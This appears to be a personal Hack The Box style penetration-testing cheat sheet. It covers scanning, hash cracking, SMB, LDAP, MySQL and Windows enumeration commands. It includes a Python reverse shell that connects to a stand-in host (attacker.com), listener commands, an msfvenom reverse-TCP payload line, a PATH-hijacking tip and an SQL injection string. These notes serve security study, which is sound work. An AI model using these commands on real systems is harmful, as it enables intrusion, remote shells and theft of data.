% -nmap -sC -sV -p- [IP]
scp [source] [dest] (dest htb == username@hostname:dirpath)
pwnbox wordlists 
	 -/opt/useful/SecLists/Usernames/Names/names.txt

ftp
	url : ftp://user:password@host:port/path (don't forget the "/" at the end if you want to get a directory)

python
	open shell
		python3 -c "import pty; pty.spawn('/bin/bash')"
	reverse shell
		export RHOST=attacker.com
		export RPORT=12345
		python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
	listener for reverse shell on attack machine
		socat file:`tty`,raw,echo=0 tcp-listen:12345
			OR
		nc -lvnkp 12345
	make shell better
		Ctrl+Z (to put shell in bg)
		stty -raw
		fg 

hashcat
	hashcat --example-hashes |grep -b1 -A3 [hash type] //to find the mode
	hashcat -m [mode, recovered up there] -a 0 [path_to_hash] [path_to_wordlist]

linux
	find . -name [root,user].txt
	sudo -l //check commands that can be run as sudo with your current user
	export PATH=[enter folder to add to path]:$PATH //think about modifying the path to make a common command execute YOUR code :D
	kill -BUS [process] //SIGBUS can generate crashlogs

msfconsole
	searchsploit [name of service etc.]
	msfvenom -p windows/powershell/reverse_tcp LHOST=[My IP] LPORT=[Chosen Port for Reverse Shell] -a x86 -f ps1 -o pwn.ps1
	use exploit/multi/handler

smbclient 
	smbclient \\\\[ip]\\[directory to bind] {-U [user] OR -N (if no user)} -c [command]
	useful command : 'prompt OFF; recurse ON; mget*' (to download everything)

mysql
	mysql -u [user] -D [name of database] -p [password]
	show databases;
	select [database];
	show tables;

Windows
	more < FILE_PATH | findstr ".exe"
	net user [username]
	Get-ADUser -identity [username] -properties * //enumerate group membership
	sudo gem install evil-winrm
		evil-winrm -i [IP of victim machine] -u [user to connect to] -p [password of user]
	icacls [folder or file name] //Check permissions of users

SQL Injection
	admin' OR '1'='1 //TOSTUDY

ffuf
	ffuf -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u [url of host to fuzz] -H 'Host: [put FUZZ in places you want to fuzz example : FUZZ.schooled.htb]' -fs [filter packet with length]

ldap 
	nmap -n -sV --script "ldap* and not brute" <IP>smb
	ldap_search
		https://github.com/m8r0wn/ldap_search
		sudo ldap_search -U users.txt -p [password] -d [ldap domain] //with users.txt as list of users

impacket
	https://www.kali.org/tools/impacket-scripts/
